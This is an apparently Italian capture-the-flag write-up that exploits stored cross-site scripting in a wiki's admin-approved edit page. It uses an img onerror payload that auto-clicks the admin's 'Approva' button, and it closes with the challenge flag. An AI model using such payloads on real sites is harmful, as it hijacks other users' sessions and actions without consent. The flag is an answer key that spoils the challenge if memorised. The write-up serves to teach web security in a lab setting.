Il sito della challenge è lo stesso della precedente.

Una volta effettuato il login ci vengono nuovamente presentate diverse pagine, e in questo caso quella che ci interessa è quella nella sezione "Pagine Speciali", cioè
http://bibbopedia.challs.olicyber.it/wiki/gabibbo .

Anche in questo caso abbiamo la possibilità di modificare la pagina a nostro piacimento, ma questa volta la modifica deve essere approvata dall'admin.

Facciamo un test inserendo un semplice ```<script>alert(1)</script>```

<img width="1750" height="157" alt="immagine" src="https://github.com/user-attachments/assets/72302298-7701-4ad2-aea0-74de5098abc5" />

<img width="1761" height="214" alt="immagine" src="https://github.com/user-attachments/assets/e9b63cbd-be4a-47c5-8dac-956b6a112e2f" />

Questa volta togliere l'attributo ```disabled``` non basta, ed inoltre notiamo anche che in realtà il tag script viene sanificato:

<img width="372" height="99" alt="immagine" src="https://github.com/user-attachments/assets/d66ba007-ebd3-454b-bf06-6e0eaa0e0f81" />

Possiamo però provare un'altra strada, utilizzando il tag imc con l'attributo onerror, attivo al mancato caricamento dell'immagine.

Proviamo il payload ```<img src="x" onerror="alert('test alert')">```

<img width="1746" height="322" alt="immagine" src="https://github.com/user-attachments/assets/5d6f67e5-a0a0-4595-9e78-348c825651bc" />

Abbiamo XSS!

Ora dobbiamo però trovare il modo di farci approvare la richiesta di modifica direttamente dall'admin, e uno dei modi in cui possiamo farlo è il seguente:

```<img src=x onerror="(function(){var els=document.querySelectorAll('button,a,input');for(var i=0;i<els.length;i++){var t=els[i].innerText||els[i].value||''; if(t.indexOf('Approva')>-1){els[i].click();break;}}})()">```

Il payload agisce nel seguente modo:

-Cerca tutti i possibili elementi cliccabili nella pagina

-Scorre la lista e cerca un elemento che contiene la parola "Approva"

-Se lo trova, simula il click sull'elemento


Testiamo il payload:

<img width="1409" height="184" alt="immagine" src="https://github.com/user-attachments/assets/8d5c4d69-8a21-462e-a584-cbdcc52ba8be" />


**flag{cr0ss_sit3_spl4shing}**
